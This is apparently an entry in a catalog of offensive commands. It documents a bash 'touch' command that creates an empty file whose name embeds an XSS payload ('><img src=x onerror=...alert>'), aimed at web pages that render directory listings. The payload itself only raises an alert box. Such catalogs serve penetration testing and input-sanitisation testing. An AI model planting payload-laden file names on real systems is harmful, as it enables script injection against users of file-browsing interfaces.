---
id: cmd-uuid-2
data: 'touch ''><img src=x onerror=javascript:alert("xss")>'''
tags:
  - file-creation
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:26.345Z'
verified: false
validated: true
submitted: true
---
---

# touch '><img src=x onerror=javascript:alert("xss")>'

## Command

```bash
touch '><img src=x onerror=javascript:alert("xss")>'
```

## Description

Creates an empty file with a name that embeds an XSS payload, used to store malicious content for later exploitation in directory listings.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'><img src=x onerror=javascript:alert("xss")>'` | File name with quoted payload | Yes |

## Examples

### Basic Usage

```bash
touch '><img src=x onerror=javascript:alert("xss")>'
```

### Advanced Usage

```bash
touch -a '><img src=x onerror=javascript:alert("xss")>'  # Update access time
```

## Expected Output

No output on success; file is created with 0 bytes and the exact name.

## Related

- [[commands/mkdir-xss-directory]]
- [[procedures/Create-Malicious-XSS-File]]

